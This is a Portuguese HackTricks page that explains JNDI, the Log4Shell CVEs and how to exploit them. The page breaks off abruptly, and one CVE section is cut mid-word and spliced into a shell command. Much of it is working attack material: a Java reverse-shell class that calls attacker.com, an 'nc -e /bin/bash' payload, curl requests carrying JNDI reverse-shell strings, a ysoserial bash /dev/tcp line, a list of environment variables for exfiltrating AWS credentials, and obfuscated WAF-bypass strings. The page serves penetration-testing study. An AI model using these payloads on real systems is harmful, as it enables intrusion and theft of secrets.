# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que importam mais para que voc√™ possa corrigi-las mais rapidamente. Intruder rastreia sua superf√≠cie de ataque, executa varreduras proativas de amea√ßas, encontra problemas em toda a sua pilha tecnol√≥gica, de APIs a aplicativos web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Informa√ß√µes B√°sicas

JNDI est√° presente no Java desde o final dos anos 90. √â um servi√ßo de diret√≥rio que **permite que um programa Java encontre dados atrav√©s de um diret√≥rio usando um servi√ßo de nomes**. Um servi√ßo de nomes associa valores (vincula√ß√µes), para que possam ser obtidos atrav√©s de sua refer√™ncia no diret√≥rio.

JNDI possui uma s√©rie de **interfaces de provedor de servi√ßo** (SPIs) que permitem o uso de uma variedade de servi√ßos de diret√≥rio. O objetivo do JNDI √© obter dados de outros sistemas com muita facilidade. Voc√™ pode at√© obter objetos Java remotamente, e √© aqui que surge um problema.

Por exemplo, existem SPIs para o **CORBA COS** (Common Object Service), o **Java RMI** (Remote Method Interface) Registry e **LDAP**.

![](<../../.gitbook/assets/image (627).png>)

### Refer√™ncia de Nomes JNDI

Para recuperar Objetos Java, voc√™ poderia serializ√°-los e salvar a representa√ß√£o bin√°ria. Mas h√° casos em que isso n√£o funciona (talvez porque os dados sejam muito grandes ou qualquer outra coisa).\
Para salvar Objetos Java mais facilmente, **s√£o usadas Refer√™ncias de Nomes**.\
Existem 2 tipos de Refer√™ncias de Nomes:

* **Endere√ßos de Refer√™ncia**: Isso indica o endere√ßo do Objeto (_rmi://server/ref_), ent√£o o **objeto ser√° recuperado desse endere√ßo**.
* **F√°brica Remota**: Neste caso, uma **classe de f√°brica remota** ser√° apontada na refer√™ncia JNDI, ent√£o, seguindo o endere√ßo JNDI, a classe remota ser√° retirada da f√°brica remota e a **classe ser√° baixada e carregada**.

Isso √© perigoso porque **atacantes podem fazer o sistema carregar objetos arbitr√°rios e executar c√≥digo arbitr√°rio**, portanto, algumas prote√ß√µes existem:

* **RMI**: `java.rmi.server.useCodeabseOnly = true` por padr√£o desde o **JDK 7u21**, caso contr√°rio, permitir√° carregar objetos Java personalizados remotamente. Al√©m disso, mesmo que a prote√ß√£o esteja desativada, um **Gerenciador de Seguran√ßa** √© imposto para configurar o que pode ser carregado.
* **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` por padr√£o desde o **JDK** **6u141, 7u131, 8u121**, e n√£o permitir√° executar objetos Java arbitr√°rios baixados. Mas se isso for definido como `true`, permitir√° e **nenhum Gerenciador de Seguran√ßa ser√° imposto**.
* **CORBA**: N√£o h√° propriedade a ser configurada, mas o **Gerenciador de Seguran√ßa √© sempre imposto**.

Al√©m disso, o **Gerenciador de Nomes**, aquele que vai seguir os links JNDI, n√£o tem nenhum Gerenciador de Seguran√ßa ou propriedade a ser configurada, ent√£o ele sempre tentar√° obter o objeto.

Como voc√™ pode ver, as **prote√ß√µes em geral n√£o s√£o suficientes** porque n√£o h√° **prote√ß√£o contra o carregamento de JNDI de endere√ßos aleat√≥rios** e as prote√ß√µes de RMI, LDAP e CORBA podem ser contornadas (dependendo da configura√ß√£o) para **carregar objetos Java arbitr√°rios** ou para **carregar objetos Java** que abusar√£o de componentes existentes no aplicativo como **gadgets para executar c√≥digo arbitr√°rio**.

Exemplos de URLs para abusar do JNDI:

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

### Exemplo de JNDI

![](<../../.gitbook/assets/image (655) (1) (1).png>)

Mesmo que voc√™ tenha definido um **`PROVIDER_URL`**, voc√™ pode indicar um diferente em uma pesquisa e ele ser√° acessado: `ctx.lookup("<attacker-controlled-url>")` e √© isso que um atacante vai abusar para carregar objetos arbitr√°rios de um sistema controlado por ele.

### CORBA

Um **Interoperable Object Reference (IOR)** √© uma refer√™ncia CORBA ou RMI-IIOP que identifica exclusivamente um objeto em um servidor CORBA remoto. IORs podem estar em formato bin√°rio ou representa√ß√£o hexadecimal em string do bin√°rio.\
Entre outras informa√ß√µes, cont√©m o **Type ID** (um identificador √∫nico para uma interface) e o **Codebase** (localiza√ß√£o remota usada para obter a classe stub).\
Note que **por padr√£o CORBA n√£o pode ser abusado**.\
Requer:

* Um **Gerenciador de Seguran√ßa deve ser instalado**
* Conex√£o com o **codebase controlado pelo atacante deve ser permitida** pelo Gerenciador de Seguran√ßa. Existem diferentes maneiras de permitir isso:
* Permiss√£o de socket: `permissions java.net.SocketPermission "*:1098-1099", "connect";`
* Permiss√£o de arquivo permitindo ler todos os arquivos: `permission java.io.FilePermission "<<ALL FILES>>", "read";`
* Permiss√£o de arquivo para ler a pasta onde o atacante pode fazer upload dos exploits (classes ou arquivo zip)

Voc√™ pode encontrar **pol√≠ticas de fornecedores permitindo isso por padr√£o**.

### RMI

Como indicado na se√ß√£o anterior **Refer√™ncia de Nomes JNDI, RMI por padr√£o n√£o permitir√° baixar Classes Java arbitr√°rias**. E, al√©m disso, mesmo que permita, voc√™ precisar√° **contornar as pol√≠ticas do Gerenciador de Seguran√ßa** (na se√ß√£o anterior aprendemos que isso era poss√≠vel com CORBA).

### LDAP

Primeiro de tudo, precisamos distinguir entre uma Pesquisa e uma Consulta.\
Uma **pesquisa** usar√° uma URL como `ldap://localhost:389/o=JNDITutorial` para encontrar o objeto JNDITutorial de um servidor LDAP e **recuperar seus atributos**.\
Uma **consulta** √© destinada a **servi√ßos de nomes** pois queremos obter **o que quer que esteja vinculado a um nome**.

Se a pesquisa LDAP foi invocada com **SearchControls.setReturningObjFlag() com `true`, ent√£o o objeto retornado ser√° reconstru√≠do**.

Portanto, existem v√°rias maneiras de atacar essas op√ß√µes.\
Um **atacante pode envenenar registros LDAP introduzindo payloads** neles que ser√£o executados nos sistemas que os coletam (muito √∫til para **comprometer dezenas de m√°quinas** se voc√™ tiver acesso ao servidor LDAP). Outra maneira de explorar isso seria realizar um **ataque MitM em uma pesquisa LDAP**, por exemplo.

Caso voc√™ consiga **fazer um aplicativo resolver uma URL JNDI LDAP**, voc√™ pode controlar o LDAP que ser√° pesquisado, e voc√™ poderia enviar de volta o exploit (log4shell).

#### Exploit de Deserializa√ß√£o

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

O **exploit √© serializado** e ser√° desserializado.\
Caso `trustURLCodebase` seja `true`, um atacante pode fornecer suas pr√≥prias classes no codebase, se n√£o, ele precisar√° abusar de gadgets no classpath.

#### Exploit de Refer√™ncia JNDI

√â mais f√°cil atacar esse LDAP usando **refer√™ncias JavaFactory**:

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## Vulnerabilidade Log4Shell

A vulnerabilidade √© introduzida no Log4j porque ele suporta uma [**sintaxe especial**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) na forma `${prefix:name}` onde `prefix` √© um dos v√°rios [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) diferentes onde `name` deve ser avaliado. Por exemplo, `${java:version}` √© a vers√£o atual em execu√ß√£o do Java.

Em [**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) foi adicionado um `jndi` Lookup da seguinte forma: ‚ÄúO JndiLookup permite que vari√°veis sejam recuperadas via JNDI. Por padr√£o, a chave ser√° prefixada com java:comp/env/, no entanto, se a chave contiver um **":" nenhum prefixo ser√° adicionado**.‚Äù

Com um **: presente** na chave, como em `${jndi:ldap://example.com/a}` n√£o h√° **prefixo** e o **servidor LDAP √© consultado pelo objeto**. E esses Lookups podem ser usados tanto na configura√ß√£o do Log4j quanto quando linhas s√£o registradas.

Portanto, a √∫nica coisa necess√°ria para obter RCE √© uma **vers√£o vulner√°vel do Log4j processando informa√ß√µes controladas pelo usu√°rio**. E porque esta √© uma biblioteca amplamente utilizada por aplicativos Java para registrar informa√ß√µes (incluindo aplicativos voltados para a Internet), era muito comum ter log4j registrando, por exemplo, cabe√ßalhos HTTP recebidos como o User-Agent. No entanto, log4j **n√£o √© usado apenas para registrar informa√ß√µes HTTP, mas qualquer entrada** e dados que o desenvolvedor indicou.

## CVEs Log4Shell

* [**CVE-2021-44228**](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Cr√≠tico]**: A vulnerabilidade original 'Log4Shell' √© uma falha de [deserializa√ß√£o n√£o confi√°vel](https://cwe.mitre.org/data/definitions/502.html). Classificada como cr√≠tica em gravidade, esta pontua 10 na escala [CVSS](https://www.first.org/cvss/) e **concede habilidades de execu√ß√£o de c√≥digo remoto (RCE) a atacantes n√£o autenticados**, permitindo a tomada completa do sistema.\
\
Reportado por Chen Zhaojun da Alibaba Cloud Security Team para a Apache em 24 de novembro, CVE-2021-44228 impacta as configura√ß√µes padr√£o de v√°rios frameworks Apache, incluindo Apache Struts2, Apache Solr, Apache Druid, Apache Flink e outros.\
\
Sendo a mais perigosa de todas, essa vulnerabilidade se esconde no componente [log4j-core](https://search.maven.org/artifact/org.apache.logging.log4j/log4j-core), limitado √†s vers√µes 2.x: de 2.0-beta9 at√© e incluindo 2.14.1. Uma corre√ß√£o para Log4Shell foi lan√ßada na vers√£o 2.15.0, mas considerada incompleta (continue lendo).\
\
O analista de intelig√™ncia de amea√ßas Florian Roth compartilhou regras Sigma \[[1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)] que podem ser empregadas como uma das defesas.\\
* [**CVE-2021-45046**](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) \[**Cr√≠tico**, anteriormente Baixo]: Esta √© uma falha de Nega√ß√£o de Servi√ßo (DoS) pontuando ~~3.7~~ 9.0. A falha surgiu como resultado de um **corre√ß√£o incompleta que entrou na 2.15.0** para CVE-2021-44228. Embora a corre√ß√£o aplicada √† 2.15.0 tenha resolvido em grande parte a falha, esse n√£o foi bem o caso para certas **configura√ß√µes n√£o padr√£o**.\
\
Log4j 2.15.0 faz uma "tentativa de melhor esfor√ßo" para **restringir pesquisas LDAP JNDI a \_localhost**\_ por padr√£o. Mas, **atacantes** que t√™m **controle** sobre os dados de entrada do **Mapa de Contexto de Thread (MDC)** podem criar payloads maliciosos via padr√µes de Lookup JNDI para causar ataques DoS. Isso se aplica a configura√ß√µes n√£o padr√£o nas quais um Layout de Padr√£o n√£o padr√£o usando um Context Lookup, por exemplo, \$${ctx:loginId}, ou um padr√£o de Mapa de Contexto de Thread (%X, %mdc, ou %MDC).\
\
O **bypass tirado deste** [**tweet**](https://twitter.com/marcioalm/status/1471740771581652995) foi:\
_Aqui est√° um PoC de como contornar as verifica√ß√µes allowedLdapHost e allowedClasses no Log4J 2.15.0. para alcan√ßar RCE: **`${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`** e para contornar allowedClasses basta escolher um nome para uma classe no JDK. A deserializa√ß√£o ocorrer√° como de costume._\
\_\_\
\_\_"Log4j 2.16.0 corrige este problema removendo o suporte para padr√µes de pesquisa de mensagens e desativando a funcionalidade JNDI por padr√£o", afirma o aviso do NVD. Para aqueles na filial 2.12.1, uma corre√ß√£o foi retroportada para 2.12.2.\\
* [**CVE-2021-4104**](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[Alto]**: Dissemos que as vers√µes Log4j 2.x eram vulner√°veis? E quanto ao **Log4j 1.x**?\
\
Embora anteriormente considerado seguro, Log4Shell encontrou uma maneira de se esconder no Log4j mais antigo tamb√©m. Essencialmente, **configura√ß√£o n√£o padr√£o de inst√¢ncias Log4j 1.x usando a classe \_JMSAppender**\_\*\* tamb√©m se tornam suscet√≠veis √† falha de deserializa√ß√£o n√£o confi√°vel\*\*.\
\
Embora uma variante menos grave de CVE-2021-44228, no entanto, este CVE impacta todas as vers√µes dos componentes [log4j:log4j](https://search.maven.org/artifact/log4j/log4j) e [org.apache.log4j:log4j](https://mvnrepository.com/artifact/org.apache.log4j/log4j) para os quais existem apenas lan√ßamentos 1.x. Como estas s√£o vers√µes [fim de vida](https://logging.apache.org/log4j/1.2/), **uma corre√ß√£o para a filial 1.x n√£o existe em lugar algum**, e deve-se atualizar para _log4j-core_ 2.17.0. (Aparentemente 1.0 n√£o √© vulner√°vel).\\
* [**CVE-2021-42550**](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Moderado]:** Esta √© uma vulnerabilidade no **framework de logging Logback**. Sucessor da biblioteca Log4j 1.x, Logback afirma continuar "onde o log4j 1.x parou."\
\
At√© a semana passada, Logback tamb√©m [se gabava](https://archive.md/QkzIy) de que, por ser "n√£o relacionado ao log4j 2.x, \[logback] n√£o compartilha suas vulnerabilidades."\
\
Ess
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Verifica√ß√£o**

Algumas das plataformas listadas anteriormente permitir√£o que voc√™ insira alguns dados vari√°veis que ser√£o registrados quando solicitados.\
Isso pode ser muito √∫til para 2 coisas:

* Para **verificar** a vulnerabilidade
* Para **exfiltrar informa√ß√µes** abusando da vulnerabilidade

Por exemplo, voc√™ poderia solicitar algo como:\
ou como `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** e se um **pedido DNS for recebido com o valor da vari√°vel de ambiente**, voc√™ sabe que a aplica√ß√£o est√° vulner√°vel.

Outras informa√ß√µes que voc√™ poderia tentar **exfiltrar**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### Informa√ß√µes sobre RCE

{% hint style="info" %}
Hosts rodando em **vers√µes do JDK superiores a 6u141, 7u131, 8u121 estar√£o protegidos contra o vetor de carregamento de classe LDAP** **MAS N√ÉO contra o vetor de deserializa√ß√£o**. Isso ocorre porque `com.sun.jndi.ldap.object.trustURLCodebase` √© desativado por padr√£o, portanto, o JNDI n√£o pode carregar codebase remoto usando LDAP. Mas √© importante enfatizar que deserializa√ß√£o e vazamento de vari√°veis ainda s√£o poss√≠veis.\
Isso significa que para **explorar as vers√µes mencionadas** voc√™ precisar√° **abusar de algum gadget confi√°vel** que exista na aplica√ß√£o java (usando ysoserial ou JNDIExploit, por exemplo). Mas para explorar vers√µes inferiores, voc√™ pode faz√™-las carregar e executar classes arbitr√°rias (o que torna o ataque mais f√°cil).

Para **mais informa√ß√µes** (_como limita√ß√µes nos vetores RMI e CORBA_) **consulte a se√ß√£o anterior de Refer√™ncia de Nomenclatura JNDI** ou [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec com payload personalizado

_Este truque √© totalmente retirado da **caixa THM:**_ [_**https://tryhackme.com/room/solar**_](https://tryhackme.com/room/solar)__

Para este exploit, a ferramenta [**marshalsec**](https://github.com/mbechler/marshalsec) (baixe uma [**vers√£o jar daqui**](https://github.com/RandomRobbieBF/marshalsec-jar)) ser√° usada para criar um servidor de refer√™ncia LDAP para direcionar conex√µes ao nosso servidor HTTP secund√°rio onde o exploit ser√° servido:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
```java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {
    static {
        try {
            String host="attacker.com";
            int port=4444;
            String cmd="/bin/bash";
            Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s=new Socket(host,port);
            InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
            OutputStream po=p.getOutputStream(), so=s.getOutputStream();
            while(!s.isClosed()) {
                while(pi.available()>0)
                    so.write(pi.read());
                while(pe.available()>0)
                    so.write(pe.read());
                while(si.available()>0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                }
                catch (Exception e){
                }
            };
            p.destroy();
            s.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
{% endcode %}

Queremos que a v√≠tima carregue o c√≥digo que nos enviar√° um shell reverso, ent√£o voc√™ pode criar um arquivo java chamado Exploit.java com o seguinte conte√∫do:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
{% endcode %}

Crie o **arquivo de classe** executando: `javac Exploit.java -source 8 -target 8` e depois execute um **servidor HTTP** no mesmo diret√≥rio onde o arquivo de classe foi criado: `python3 -m http.server`.\
O **servidor LDAP do marshalsec deve estar apontando para este servidor HTTP**.\
Ent√£o, voc√™ pode fazer o **servidor web vulner√°vel executar a classe de exploit** enviando um payload como:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
_Por favor, note que se o Java n√£o estiver configurado para carregar base de c√≥digo remoto usando LDAP, este exploit personalizado n√£o funcionar√°. Nesse caso, voc√™ precisa abusar de uma classe confi√°vel para executar c√≥digo arbitr√°rio._

### RCE - **JNDIExploit**

{% hint style="info" %}
Observe que, por algum motivo, o autor removeu este projeto do github ap√≥s a descoberta do log4shell. Voc√™ pode encontrar uma vers√£o em cache em [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2), mas se voc√™ quiser respeitar a decis√£o do autor, use um m√©todo diferente para explorar essa vulnerabilidade.

Al√©m disso, voc√™ n√£o pode encontrar o c√≥digo-fonte na m√°quina wayback, ent√£o ou analise o c√≥digo-fonte, ou execute o arquivo jar sabendo que voc√™ n√£o sabe o que est√° executando.
{% endhint %}

Para este exemplo, voc√™ pode simplesmente executar este **servidor web vulner√°vel ao log4shell** na porta 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_no README voc√™ encontrar√° como execut√°-lo_). Este aplicativo vulner√°vel est√° registrando com uma vers√£o vulner√°vel do log4shell o conte√∫do do cabe√ßalho da solicita√ß√£o HTTP _X-Api-Version_.

Ent√£o, voc√™ pode baixar o arquivo jar do **JNDIExploit** e execut√°-lo com:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Ap√≥s ler o c√≥digo por alguns minutos, em _com.feihong.ldap.LdapServer_ e _com.feihong.ldap.HTTPServer_, voc√™ pode ver como os **servidores LDAP e HTTP s√£o criados**. O servidor LDAP entender√° qual payload precisa ser fornecido e redirecionar√° a v√≠tima para o servidor HTTP, que fornecer√° o exploit.
Em _com.feihong.ldap.gadgets_, voc√™ pode encontrar **alguns gadgets espec√≠ficos** que podem ser usados para executar a a√ß√£o desejada (potencialmente executar c√≥digo arbitr√°rio). E em _com.feihong.ldap.template_, voc√™ pode ver as diferentes classes de template que ir√£o **gerar os exploits**.

Voc√™ pode ver todos os exploits dispon√≠veis com **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Alguns √∫teis s√£o:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Ent√£o, no nosso exemplo, j√° temos aquela aplica√ß√£o vulner√°vel em docker em execu√ß√£o. Para atac√°-la:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Ao enviar os ataques, voc√™ ver√° algumas sa√≠das no terminal onde executou **JNDIExploit-1.2-SNAPSHOT.jar**.

**Lembre-se de verificar `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` para outras op√ß√µes de explora√ß√£o. Al√©m disso, caso precise, voc√™ pode alterar a porta dos servidores LDAP e HTTP.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

De maneira semelhante ao exploit anterior, voc√™ pode tentar usar [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) para explorar essa vulnerabilidade.\
Voc√™ pode gerar as URLs para enviar √† v√≠tima executando:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Este ataque usando um objeto java personalizado gerado funcionar√° em laborat√≥rios como a **sala solar THM**. No entanto, isso geralmente n√£o funcionar√° (j√° que por padr√£o o Java n√£o est√° configurado para carregar base de c√≥digo remoto usando LDAP) Eu acho que √© porque n√£o est√° abusando de uma classe confi√°vel para executar c√≥digo arbitr√°rio._

### RCE - ysoserial & JNDI-Exploit-Kit

Esta op√ß√£o √© realmente √∫til para atacar **vers√µes Java configuradas para confiar apenas em classes especificadas e n√£o em todas**. Portanto, **ysoserial** ser√° usado para gerar **serializa√ß√µes de classes confi√°veis** que podem ser usadas como gadgets para **executar c√≥digo arbitr√°rio** (_a classe confi√°vel abusada pelo ysoserial deve ser usada pelo programa java da v√≠tima para que o exploit funcione_).

Usando **ysoserial** ou [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) voc√™ pode criar o exploit de desserializa√ß√£o que ser√° baixado pelo JNDI:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Utilize o [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) para gerar **links JNDI** onde o exploit estar√° aguardando por conex√µes das m√°quinas vulner√°veis. Voc√™ pode servir **diferentes exploits que podem ser gerados automaticamente** pelo JNDI-Exploit-Kit ou at√© mesmo seus **pr√≥prios payloads de deserializa√ß√£o** (gerados por voc√™ ou ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

Agora voc√™ pode facilmente usar um link JNDI gerado para explorar a vulnerabilidade e obter um **reverse shell** apenas enviando para uma vers√£o vulner√°vel do log4j: **`${ldap://10.10.14.10:1389/generated}`**

### Bypasses
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ƒ±}}:ldap://...} //Notice the unicode "i"
```
### Scanners Autom√°ticos

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Encontrar bibliotecas locais vulner√°veis

### Laborat√≥rios para testar

* [**M√°quina LogForge HTB**](https://app.hackthebox.com/tracks/UHC-track)
* [**Sala Solar Try Hack Me**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Explora√ß√£o P√≥s-Log4Shell

Neste [**writeup de CTF**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) √© bem explicado como √© potencialmente **poss√≠vel** **abusar** de algumas funcionalidades do **Log4J**.

A [**p√°gina de seguran√ßa**](https://logging.apache.org/log4j/2.x/security.html) do Log4j tem algumas frases interessantes:

> A partir da vers√£o 2.16.0 (para Java 8), o **recurso de lookups de mensagens foi completamente removido**. **Lookups na configura√ß√£o ainda funcionam**. Al√©m disso, o Log4j agora desativa o acesso ao JNDI por padr√£o. Lookups de JNDI na configura√ß√£o agora precisam ser habilitados explicitamente.

> A partir da vers√£o 2.17.0, (e 2.12.3 e 2.3.1 para Java 7 e Java 6), **apenas strings de lookup na configura√ß√£o s√£o expandidas recursivamente**; em qualquer outro uso, apenas o lookup de n√≠vel superior √© resolvido, e quaisquer lookups aninhados n√£o s√£o resolvidos.

Isso significa que por padr√£o voc√™ pode **esquecer de usar qualquer exploit `jndi`**. Al√©m disso, para realizar **lookups recursivos** voc√™ precisa t√™-los configurado.

Por exemplo, nesse CTF isso foi configurado no arquivo log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Consultas de Ambiente

Neste CTF, o atacante controlava o valor de `${sys:cmd}` e precisava exfiltrar a flag de uma vari√°vel de ambiente.\
Como visto nesta p√°gina em [**cargas √∫teis anteriores**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification), existem diferentes maneiras de acessar vari√°veis de ambiente, como: **`${env:FLAG}`**. Neste CTF isso foi in√∫til, mas pode n√£o ser em outros cen√°rios da vida real.

### Exfiltra√ß√£o em Exce√ß√µes

